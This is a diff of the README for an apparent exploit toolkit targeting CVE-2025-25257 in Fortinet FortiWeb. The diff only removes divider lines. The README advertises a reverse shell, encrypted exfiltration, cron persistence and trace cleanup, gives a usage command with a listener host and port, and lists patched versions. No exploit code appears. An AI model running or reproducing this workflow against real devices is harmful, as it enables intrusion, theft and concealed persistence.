@@ -2,7 +2,6 @@
 
 Automated proof‑of‑concept tool for **CVE‑2025‑25257** in Fortinet FortiWeb — featuring **reverse shell**, **encrypted data exfiltration**, **persistence**, and **cleanup**. This toolkit is **strictly for isolated lab/testing environments**. **DO NOT USE in production.**
 
----
 
 ## ⚙️ Features
 
@@ -13,7 +12,6 @@ Automated proof‑of‑concept tool for **CVE‑2025‑25257** in Fortinet Forti
 - 🧹 **Full cleanup**: removes shell, cron job, and SQL traces
 - 🔒 Active only while listener runs and cleanup occurs
 
----
 
 ## 📊 Severity & Affected Versions
 
@@ -25,7 +23,6 @@ Automated proof‑of‑concept tool for **CVE‑2025‑25257** in Fortinet Forti
   - FortiWeb 7.4.0–7.4.7 → Upgrade to **7.4.8+**
   - FortiWeb 7.6.0–7.6.3 → Upgrade to **7.6.4+**
 
----
 
 ## 📋 Requirements
 
@@ -35,7 +32,6 @@ Automated proof‑of‑concept tool for **CVE‑2025‑25257** in Fortinet Forti
   pip install requests
 
 
----
 ## 🚀 Usage
 
 ```bash
@@ -60,7 +56,6 @@ python3 exploit.py <target> --https --lhost <your_ip> --lport 4444 \
 
 * `--persist` (optional): enables cron persistence
 
----
 
 ## 🔧 Technical Workflow
 
@@ -76,7 +71,6 @@ python3 exploit.py <target> --https --lhost <your_ip> --lport 4444 \
 
 6. Cleanup: shell removal, cron job deletion, SQL cleanup
 
----
 
 ## ⚠️ Warnings & Ethics
 
@@ -88,7 +82,6 @@ python3 exploit.py <target> --https --lhost <your_ip> --lport 4444 \
 
 * 🛡️ Consider disabling HTTP/HTTPS management until patched
 
----
 
 ## 🛠️ Future Enhancements
 
@@ -100,7 +93,6 @@ python3 exploit.py <target> --https --lhost <your_ip> --lport 4444 \
 
 * Integration with Red Team frameworks (Cobalt Strike, Covenant)
 
----
 
 ## 📚 References
 
@@ -110,7 +102,6 @@ python3 exploit.py <target> --https --lhost <your_ip> --lport 4444 \
 
 * EventusSecurity, InfoSecBulletin, Arctic Wolf, Tenable
 
----
 
 ## 📄 License
 
